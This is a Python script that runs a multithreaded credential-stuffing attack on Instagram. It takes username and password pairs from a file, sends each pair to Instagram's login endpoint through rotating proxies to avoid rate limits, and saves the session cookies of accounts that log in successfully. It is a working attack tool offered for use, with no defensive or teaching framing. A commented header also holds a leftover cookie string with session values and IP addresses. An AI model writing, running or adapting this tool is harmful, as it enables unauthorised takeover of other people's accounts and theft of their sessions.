import requests
from pprint import pprint
import threading

# set variables for files' path
userpassFilepath = "userpass.txt"
proxiesFilepath = "proxies.txt"
outputFilepath = "sessonid.txt"

# open file for output
outputf = open(outputFilepath, "a")

# count of Threads
thread_count = 10

def processdata(userpasses = [], proxylist=[]):
    """
    Process data first step
    :param userpasses: array
    :param proxylist: array
    :return: array
    """
    data = []
    proxyid = 0
    for row in userpasses:
        try:
            user = row.split(':')[0]
            password = row.split(':')[1]
        except:
            password = ''
        data.append([user, password, proxylist[proxyid] if len(proxylist) >0 else None])
        proxyid = proxyid + 1 if proxyid + 1 < len(proxylist) else 0
    return data

def process2(_data, count):
    """
    Process data second step
    :param _data: array
    :param count: int
    :return: array
    """
    split_arr = [0]

    for i in range(count):
        unit = int(len(_data)/count)
        split_arr.append(unit*(i + 1))
    split_arr[len(split_arr)-1] = len(_data)

    data = []
    for i in range(len(split_arr)-1):
        data.append(_data[split_arr[i]:split_arr[i + 1]])
    return data

def OutPut(text):
    """
    Output text to output file
    :param text: string
    :return: None
    """
    outputf.write("{}\n".format(text))

def getCSRFToken(proxies):
    """
    Get csrf_token from login page of instagram
    :return: string
    """
    csrf_Url = "https://www.instagram.com/accounts/login/"
    res = requests.get(csrf_Url, proxies=proxies)
    csrf_token = res.cookies['csrftoken']
    return csrf_token


def LoginAction(row):
    try:
        user = row[0]
        password = row[1]
        proxy = row[2]
    except:
        user = ""
        password = ""
        proxy = "127.0.0.1:80"

    url = "https://www.instagram.com/accounts/login/ajax/"
    payload = "username={0}&password={1}".format(user, password)
    proxies = {
        "http": "http://" + proxy,
        "https": "https://" + proxy
    }

    headers = {
        # 'cookie': "ig_cb=1; mid=XPmyXwALAAGyaJ6fKF2NNpS8Btdo; fbm_124024574287414=base_domain=.instagram.com; shbid=11282; shbts=1559924848.659384; csrftoken=bRilygvIFbkudi4JuZD6QeGTYQJBRAZg; rur=FTW; urlgen=\"{\\\"37.231.220.117\\\": 47589\\054 \\\"212.129.4.6\\\": 12876\\054 \\\"94.128.90.231\\\": 47589\\054 \\\"94.128.85.88\\\": 47589}:1hbb6M:EwTyrat4lCmfs2kJVWeiJ6EKKmc\"",
        'origin': "https://www.instagram.com",
        'x-instagram-ajax': "516915163258",
        'content-type': "application/x-www-form-urlencoded",
        'x-requested-with': "XMLHttpRequest",
        'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        'x-csrftoken': getCSRFToken(proxies),
        'x-ig-app-id': "936619743392459",
        'referer': "https://www.instagram.com/accounts/login/?source=auth_switcher"
        }
    try:
        print("===========================================================================")
        print("Using Proxy : {0} , Username : {1}, Password : {2}".format(proxy, user, password))
        response = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=10)
        OutPut(response.cookies['sessionid'])
    except:
        pass


def TUnit(data):
    """
    Unit function of Thread
    :param data: array
    :return: None
    """
    for dt in data:
        LoginAction(dt)

if __name__=='__main__':
    # read file contents
    with open(userpassFilepath, "r") as f:
        userpasses = f.readlines()
        userpasses = [se.strip() for se in userpasses]

    with open(proxiesFilepath, "r") as f1:
        proxylist = f1.readlines()
        proxylist = [se.strip() for se in proxylist]

    data = processdata(userpasses=userpasses, proxylist=proxylist)
    data = process2(data, thread_count)


    # create Threads
    runningThreads = []

    for row in data:
        t = threading.Thread(target=TUnit, args=(row,))
        runningThreads.append(t)
        t.start()
    for th in runningThreads:
        th.join()

    # close file for output
    outputf.close()